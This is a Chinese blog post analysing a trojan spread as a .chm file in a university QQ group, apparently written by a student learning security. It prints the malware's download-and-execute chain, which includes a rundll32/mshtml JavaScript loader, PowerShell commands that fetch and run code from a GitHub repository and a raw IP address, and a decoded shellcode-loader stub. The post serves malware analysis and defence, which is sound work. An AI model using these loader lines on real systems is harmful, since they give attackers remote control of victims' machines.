@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>记一次QQ群木马事件以开启一段安全之旅 | kblog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="事情的起因是这样的，在我皇家邮电大学即将举办CCTF之际，有个哥跑到大重邮的Linux的协会群放了一个精彩图片合集.chm的文件。并能够看到点击该文件的群里同学的桌面而且还有访问摄像头的功能。群里一篇慌乱，使得释放木马的哥开心的合不拢嘴。很多同学表示无能为力，我也点了一下那个文件，然后电脑卡了几秒之后然后就看到了那个文件里面并没有什么内容。这个时候我也慌了，从来没有感觉到原来安全这么的重要，于是我">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次QQ群木马事件以开启一段安全之旅">
+<meta property="og:url" content="http://kangqingfei.cn/2016/06/27/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E7%BE%A4%E6%9C%A8%E9%A9%AC%E4%BA%8B%E4%BB%B6%E4%BB%A5%E5%BC%80%E5%90%AF%E4%B8%80%E6%AE%B5%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85/index.html">
+<meta property="og:site_name" content="kblog">
+<meta property="og:description" content="事情的起因是这样的，在我皇家邮电大学即将举办CCTF之际，有个哥跑到大重邮的Linux的协会群放了一个精彩图片合集.chm的文件。并能够看到点击该文件的群里同学的桌面而且还有访问摄像头的功能。群里一篇慌乱，使得释放木马的哥开心的合不拢嘴。很多同学表示无能为力，我也点了一下那个文件，然后电脑卡了几秒之后然后就看到了那个文件里面并没有什么内容。这个时候我也慌了，从来没有感觉到原来安全这么的重要，于是我">
+<meta property="og:locale">
+<meta property="og:image" content="http://qiniu.kangqingfei.cn/blog/images/Socket-communication.png">
+<meta property="article:published_time" content="2016-06-27T09:21:53.000Z">
+<meta property="article:modified_time" content="2022-09-14T18:03:38.046Z">
+<meta property="article:author" content="kangqingfei">
+<meta property="article:tag" content="安全 渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://qiniu.kangqingfei.cn/blog/images/Socket-communication.png">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+  <link href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="kblog" type="application/atom+xml">
+</head>
+<style>
+    .pace .pace-progress {
+    	background: #1E92FB; /*进度条颜色*/
+    	height: 2px;
+    }
+    .pace .pace-progress-inner {
+     	box-shadow: 0 0 10px #1E92FB, 0 0 5px #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+    	border-top-color: #1E92FB;	/*上边框颜色*/
+    	border-left-color: #1E92FB;	/*左边框颜色*/
+    }
+    .profilepic:hover { /*头像动画效果*/
+    -webkit-animation: shake 1s;
+    animation: shake 1s;
+    };
+</style>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img src="/assest/images/kqf.png" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						<li>分类</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="/about.html">关于我</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/kangqf" title="github">github</a>
+					        
+								<a class="mail" target="_blank" href="mailto:i@kangqingfei.cn" title="mail">mail</a>
+					        
+								<a class="twitter" target="_blank" href="https://twitter.com/kangqingfei" title="twitter">twitter</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+						</div>
+					</nav>
+				</section>
+
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ACM/" style="font-size: 10px;">ACM</a> <a href="/tags/ARM/" style="font-size: 11.43px;">ARM</a> <a href="/tags/Altium-Designer/" style="font-size: 11.43px;">Altium Designer</a> <a href="/tags/BananaPro/" style="font-size: 17.14px;">BananaPro</a> <a href="/tags/BootStrap/" style="font-size: 10px;">BootStrap</a> <a href="/tags/DHCP/" style="font-size: 10px;">DHCP</a> <a href="/tags/DL/" style="font-size: 10px;">DL</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Docker-%E5%85%A5%E9%97%A8/" style="font-size: 10px;">Docker 入门</a> <a href="/tags/HG255D/" style="font-size: 10px;">HG255D</a> <a href="/tags/HTML5/" style="font-size: 10px;">HTML5</a> <a href="/tags/IP/" style="font-size: 10px;">IP</a> <a href="/tags/LIS/" style="font-size: 10px;">LIS</a> <a href="/tags/LRS/" style="font-size: 10px;">LRS</a> <a href="/tags/Makefile/" style="font-size: 10px;">Makefile</a> <a href="/tags/OpenWrt/" style="font-size: 11.43px;">OpenWrt</a> <a href="/tags/QML/" style="font-size: 10px;">QML</a> <a href="/tags/Qt/" style="font-size: 11.43px;">Qt</a> <a href="/tags/VMware/" style="font-size: 10px;">VMware</a> <a href="/tags/VPS/" style="font-size: 10px;">VPS</a> <a href="/tags/XHR2/" style="font-size: 10px;">XHR2</a> <a href="/tags/archlinux/" style="font-size: 11.43px;">archlinux</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/caffe/" style="font-size: 10px;">caffe</a> <a href="/tags/cplusplus/" style="font-size: 10px;">cplusplus</a> <a href="/tags/cpp/" style="font-size: 11.43px;">cpp</a> <a href="/tags/g/" style="font-size: 10px;">g++</a> <a href="/tags/gcc/" style="font-size: 10px;">gcc</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/hash/" style="font-size: 10px;">hash</a> <a href="/tags/hexo/" style="font-size: 14.29px;">hexo</a> <a href="/tags/i3/" style="font-size: 10px;">i3</a> <a href="/tags/jekyll/" style="font-size: 10px;">jekyll</a> <a href="/tags/job/" style="font-size: 18.57px;">job</a> <a href="/tags/kindle/" style="font-size: 10px;">kindle</a> <a href="/tags/lambda/" style="font-size: 10px;">lambda</a> <a href="/tags/linux/" style="font-size: 11.43px;">linux</a> <a href="/tags/make/" style="font-size: 10px;">make</a> <a href="/tags/markdown/" style="font-size: 10px;">markdown</a> <a href="/tags/media/" style="font-size: 10px;">media</a> <a href="/tags/mongo/" style="font-size: 10px;">mongo</a> <a href="/tags/network/" style="font-size: 11.43px;">network</a> <a href="/tags/node/" style="font-size: 10px;">node</a> <a href="/tags/note/" style="font-size: 12.86px;">note</a> <a href="/tags/root-fs/" style="font-size: 10px;">root-fs</a> <a href="/tags/sort/" style="font-size: 10px;">sort</a> <a href="/tags/tencent/" style="font-size: 11.43px;">tencent</a> <a href="/tags/ubuntu/" style="font-size: 11.43px;">ubuntu</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" style="font-size: 12.86px;">动态规划</a> <a href="/tags/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84/" style="font-size: 10px;">后缀数组</a> <a href="/tags/%E5%A4%B4%E6%9D%A1/" style="font-size: 10px;">头条</a> <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 14.29px;">字符串</a> <a href="/tags/%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F/" style="font-size: 10px;">安全 渗透</a> <a href="/tags/%E5%B0%81%E8%A3%85/" style="font-size: 10px;">封装</a> <a href="/tags/%E5%B5%8C%E5%85%A5%E5%BC%8F/" style="font-size: 15.71px;">嵌入式</a> <a href="/tags/%E6%AF%95%E8%AE%BE/" style="font-size: 20px;">毕设</a> <a href="/tags/%E6%B1%87%E6%80%BB/" style="font-size: 10px;">汇总</a> <a href="/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/" style="font-size: 10px;">滑动窗口</a> <a href="/tags/%E7%AC%94%E8%AF%95%E9%A2%98/" style="font-size: 10px;">笔试题</a> <a href="/tags/%E7%BB%98%E5%9B%BE/" style="font-size: 10px;">绘图</a> <a href="/tags/%E7%BC%96%E8%BE%91%E8%B7%9D%E7%A6%BB/" style="font-size: 10px;">编辑距离</a> <a href="/tags/%E7%BF%BB%E8%AF%91/" style="font-size: 10px;">翻译</a> <a href="/tags/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/" style="font-size: 10px;">背包问题</a>
+					</div>
+				</section>
+				
+
+				
+				<section class="switch-part switch-part3">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ACM/">ACM</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/basis/">basis</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/config/">config</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/jobs/">jobs</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/notes/">notes</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/test/">test</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></li></ul>
+					</div>
+				</section>
+				
+
+				
+				<section class="switch-part switch-part4">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://sentut.cn/">sentut</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.jianshu.com/users/b99b0edd4e77/latest_articles">miao1007</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<a href="/" class="profilepic">
+			
+				<img src="/assest/images/kqf.png" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+			
+			</a>
+			<hgroup>
+			  <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="/about.html">关于我</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/kangqf" title="github">github</a>
+			        
+						<a class="mail" target="_blank" href="mailto:i@kangqingfei.cn" title="mail">mail</a>
+			        
+						<a class="twitter" target="_blank" href="https://twitter.com/kangqingfei" title="twitter">twitter</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+				</div>
+			</nav>
+		</header>
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-记一次QQ群木马事件以开启一段安全之旅" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/06/27/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E7%BE%A4%E6%9C%A8%E9%A9%AC%E4%BA%8B%E4%BB%B6%E4%BB%A5%E5%BC%80%E5%90%AF%E4%B8%80%E6%AE%B5%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85/" class="article-date">
+  	<time datetime="2016-06-27T09:21:53.000Z" itemprop="datePublished">2016-06-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      记一次QQ群木马事件以开启一段安全之旅
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F/" rel="tag">安全 渗透</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+	</div>
+
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="事情的起因是这样的，在我皇家邮电大学即将举办CCTF之际，有个哥跑到大重邮的Linux的协会群放了一个精彩图片合集-chm的文件。并能够看到点击该文件的群里同学的桌面而且还有访问摄像头的功能。群里一篇慌乱，使得释放木马的哥开心的合不拢嘴。很多同学表示无能为力，我也点了一下那个文件，然后电脑卡了几秒之后然后就看到了那个文件里面并没有什么内容。这个时候我也慌了，从来没有感觉到原来安全这么的重要，于是我决心破解那个木马，并努力学习安全防御。"><a href="#事情的起因是这样的，在我皇家邮电大学即将举办CCTF之际，有个哥跑到大重邮的Linux的协会群放了一个精彩图片合集-chm的文件。并能够看到点击该文件的群里同学的桌面而且还有访问摄像头的功能。群里一篇慌乱，使得释放木马的哥开心的合不拢嘴。很多同学表示无能为力，我也点了一下那个文件，然后电脑卡了几秒之后然后就看到了那个文件里面并没有什么内容。这个时候我也慌了，从来没有感觉到原来安全这么的重要，于是我决心破解那个木马，并努力学习安全防御。" class="headerlink" title="事情的起因是这样的，在我皇家邮电大学即将举办CCTF之际，有个哥跑到大重邮的Linux的协会群放了一个精彩图片合集.chm的文件。并能够看到点击该文件的群里同学的桌面而且还有访问摄像头的功能。群里一篇慌乱，使得释放木马的哥开心的合不拢嘴。很多同学表示无能为力，我也点了一下那个文件，然后电脑卡了几秒之后然后就看到了那个文件里面并没有什么内容。这个时候我也慌了，从来没有感觉到原来安全这么的重要，于是我决心破解那个木马，并努力学习安全防御。"></a>事情的起因是这样的，在我皇家邮电大学即将举办CCTF之际，有个哥跑到大重邮的Linux的协会群放了一个<code>精彩图片合集.chm</code>的文件。并能够看到点击该文件的群里同学的桌面而且还有访问摄像头的功能。群里一篇慌乱，使得释放木马的哥开心的合不拢嘴。很多同学表示无能为力，我也点了一下那个文件，然后电脑卡了几秒之后然后就看到了那个文件里面并没有什么内容。这个时候我也慌了，从来没有感觉到原来安全这么的重要，于是我决心破解那个木马，并努力学习安全防御。</h2><span id="more"></span>
+
+<p>首先，中了该木马的电脑无一表现出出现多个PowerShell的进程，我打开任务管理器看到CPU占用最大的是<code>控制台窗口主进程</code>，可知木马肯定是通过命令行进行通信的。通过运行<code>wmic process where caption=&quot;rundll32.exe&quot; get caption,commandline /value</code>可以看到一个通信的链接</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Caption=rundll32.exe</span><br><span class="line">CommandLine=<span class="string">&quot;C:\Windows\System32\rundll32.exe&quot;</span></span><br><span class="line">javascript:<span class="string">&quot;\..\mshtml,RunHTMLApplication&quot;</span>;document.write<span class="literal">()</span>;</span><br><span class="line">h=<span class="keyword">new</span>%<span class="number">20</span><span class="constructor">ActiveXObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span>;</span><br><span class="line">h.<span class="constructor">Open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;https://github.com/maybeok007/address/raw/master/shouye&quot;</span>,<span class="params">false</span>)</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;h.<span class="constructor">Send()</span>;b=h.ResponseText;eval(b);&#125;</span><br><span class="line">catch(e)&#123;<span class="keyword">new</span>%<span class="number">20</span><span class="constructor">ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>)</span>.<span class="constructor">Run(<span class="string">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span>,0,<span class="params">true</span>)</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>可以猜测这里的这段代码应该是嵌入在那个chm文件里面的。<br>我猜大概的意思就是从github的一个仓库下载一个叫做shouye的代码然后运行它。我们在github获得那个叫做shouye的代码，大概如下：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">h = <span class="keyword">new</span> <span class="constructor">ActiveXObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span>;</span><br><span class="line">h.<span class="constructor">SetTimeouts(0, 0, 0, 0)</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">h.<span class="constructor">Open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;https://github.com/maybeok007/address/raw/master/cmd&quot;</span>,<span class="params">false</span>)</span>;</span><br><span class="line">h.<span class="constructor">Send()</span>;</span><br><span class="line">c = h.ResponseText;</span><br><span class="line">r = <span class="keyword">new</span> <span class="constructor">ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>)</span>.<span class="constructor">Run(<span class="params">c</span>,0,<span class="params">true</span>)</span>;</span><br><span class="line">&#125; catch(e1) &#123;</span><br><span class="line">p=<span class="keyword">new</span> <span class="constructor">ActiveXObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span>;</span><br><span class="line">p.<span class="constructor">SetTimeouts(0, 0, 0, 0)</span>;</span><br><span class="line">p.<span class="constructor">Open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;https://github.com/maybeok007/address/raw/master/cmd&quot;</span>,<span class="params">false</span>)</span>;</span><br><span class="line">p.<span class="constructor">Send(<span class="string">&quot;[Some thing wrong !! ]\n&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到那个shouye的代码是为了打开同样链接下面的叫做cmd的代码然后运行它。我们再获得cmd的代码，大概如下：<br><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://115.28.182.91:801/a&#39;))&quot;</code><br>可以看到这里是调用<code>powershell</code>来从服务器来down代码，然后运行，这是最新一版的代码没有折腾的价值这里就不提了，值得一提的是之前一版的代码是<a target="_blank" rel="noopener" href="https://github.com/maybeok007/address/blob/58a7cdee3b86e7d3c077bf4f0190494c9f239f46/cmd">这样的</a>：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg...省略...<span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看出的是这是通过powershell 来执行某些指令只不过这些指令是通过某些方式加密的，我们猜测这是通过Base64进行加密的，通过Base64进行解密后我们可以得到:</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>([<span class="title class_">IntPtr</span>]::<span class="title class_">Size</span> -eq <span class="number">4</span>)&#123;<span class="variable">$b</span>=<span class="string">&#x27;powershell.exe&#x27;</span>&#125;<span class="keyword">else</span>&#123;<span class="variable">$b</span>=<span class="variable">$env</span><span class="symbol">:windir+<span class="string">&#x27;\syswow64\WindowsPowerShell\v1.0\powershell.exe&#x27;</span></span>&#125;;<span class="variable">$s</span>=<span class="title class_">New</span>-<span class="title class_">Object</span> <span class="title class_">System</span>.<span class="title class_">Diagnostics</span>.<span class="title class_">ProcessStartInfo</span>;<span class="variable">$s</span>.<span class="title class_">FileName</span>=<span class="variable">$b</span>;<span class="variable">$s</span>.<span class="title class_">Arguments</span>=<span class="string">&#x27;-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#x27;</span><span class="string">&#x27;H4sI...省略...gAA&#x27;</span><span class="string">&#x27;));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();&#x27;</span>;<span class="variable">$s</span>.<span class="title class_">UseShellExecute</span>=<span class="variable">$false</span>;<span class="variable">$s</span>.<span class="title class_">RedirectStandardOutput</span>=<span class="variable">$true</span>;<span class="variable">$s</span>.<span class="title class_">WindowStyle</span>=<span class="string">&#x27;Hidden&#x27;</span>;<span class="variable">$s</span>.<span class="title class_">CreateNoWindow</span>=<span class="variable">$true</span>;<span class="variable">$p</span>=[<span class="title class_">System</span>.<span class="title class_">Diagnostics</span>.<span class="title class_">Process</span>]::<span class="title class_">Start</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>
+<p>格式化之后是这样的：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>([IntPtr]::Size -eq 4)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$b</span>=<span class="string">&#x27;powershell.exe&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$b</span>=<span class="variable">$env</span>:windir+<span class="string">&#x27;\syswow64\WindowsPowerShell\v1.0\powershell.exe&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$s</span>=New-Object System.Diagnostics.ProcessStartInfo;</span><br><span class="line"><span class="variable">$s</span>.<span class="attribute">FileName</span>=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$s</span>.<span class="attribute">Arguments</span>=<span class="string">&#x27;-nop -w hidden -c</span></span><br><span class="line"><span class="string">	$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(xxx));</span></span><br><span class="line"><span class="string">	IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>.<span class="attribute">UseShellExecute</span>=<span class="variable">$false</span>;</span><br><span class="line"><span class="variable">$s</span>.<span class="attribute">RedirectStandardOutput</span>=<span class="variable">$true</span>;</span><br><span class="line"><span class="variable">$s</span>.<span class="attribute">WindowStyle</span>=<span class="string">&#x27;Hidden&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>.<span class="attribute">CreateNoWindow</span>=<span class="variable">$true</span>;</span><br><span class="line"><span class="variable">$p</span>=[System.Diagnostics.Process]::Start(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到又是一路假镖，为了隐藏自己的服务器ip地址，作者可真是用心良苦啊。可以看到这里又是调用Powershell来运行命令，而运行的命令又是通过Base64 进行加密的。我们再次使用Base64对命令进行解密可以得到一串乱码，再次仔细查看上面的代码可以发现其实有一个<code>New-Object IO.Compression.GzipStream</code>用来对流进行压缩，可以知道不仅仅是加密还有压缩的。这里我们很自然想到可以使用VS通过C#来进行编程得到解压且解密之后的东西。经过一番百度之后我们可以写出下面这样的代码：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">System</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">System</span>.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">System</span>.Linq;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">System</span>.Text;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">System</span>.Threading.Tasks;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication1</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> Program</span><br><span class="line">    &#123;</span><br><span class="line">        static <span class="type">void</span> Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] outputb = Convert.FromBase64String(&quot;H4sI...省略...A&quot;);</span><br><span class="line">            <span class="keyword">System</span>.IO.MemoryStream cmpStream = <span class="built_in">new</span> <span class="keyword">System</span>.IO.MemoryStream(outputb);</span><br><span class="line">            <span class="keyword">System</span>.IO.Compression.GZipStream zipStream = <span class="built_in">new</span> <span class="keyword">System</span>.IO.Compression.GZipStream(cmpStream, <span class="keyword">System</span>.IO.Compression.CompressionMode.Decompress);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">System</span>.IO.StreamReader reader =<span class="built_in">new</span> <span class="keyword">System</span>.IO.StreamReader(zipStream);</span><br><span class="line">            string str = reader.ReadToEnd();</span><br><span class="line">            //string kkk  = <span class="keyword">Encoding</span>.<span class="keyword">Default</span>.GetString(outputb);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行之后我们可以得到</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">function aVNbl &#123;</span><br><span class="line">        <span class="title class_">Param</span> (<span class="variable">$vUWa37</span>, <span class="variable">$gWJz4CZjPH</span>)</span><br><span class="line">        <span class="variable">$xM8SDmw</span> = ([<span class="title class_">AppDomain</span>]::<span class="title class_">CurrentDomain</span>.<span class="title class_">GetAssemblies</span>() | <span class="title class_">Where</span>-<span class="title class_">Object</span> &#123; <span class="variable">$_</span>.<span class="title class_">GlobalAssemblyCache</span> -<span class="title class_">And</span> <span class="variable">$_</span>.<span class="title class_">Location</span></span><br><span class="line"><span class="title class_">Split</span>(<span class="string">&#x27;\\&#x27;</span>)[<span class="number">-1</span>].<span class="title class_">Equals</span>(<span class="string">&#x27;System.dll&#x27;</span>) &#125;).<span class="title class_">GetType</span>(<span class="string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        return <span class="variable">$xM8SDmw</span>.<span class="title class_">GetMethod</span>(<span class="string">&#x27;GetProcAddress&#x27;</span>).<span class="title class_">Invoke</span>(<span class="variable">$null</span>, @([<span class="title class_">System</span>.<span class="title class_">Runtime</span>.<span class="title class_">InteropServices</span>.<span class="title class_">HandleRef</span>](<span class="title class_">New</span>-<span class="title class_">Obje</span></span><br><span class="line">t <span class="title class_">System</span>.<span class="title class_">Runtime</span>.<span class="title class_">InteropServices</span>.<span class="title class_">HandleRef</span>((<span class="title class_">New</span>-<span class="title class_">Object</span> <span class="title class_">IntPtr</span>), (<span class="variable">$xM8SDmw</span>.<span class="title class_">GetMethod</span>(<span class="string">&#x27;GetModuleHandle&#x27;</span>)).<span class="title 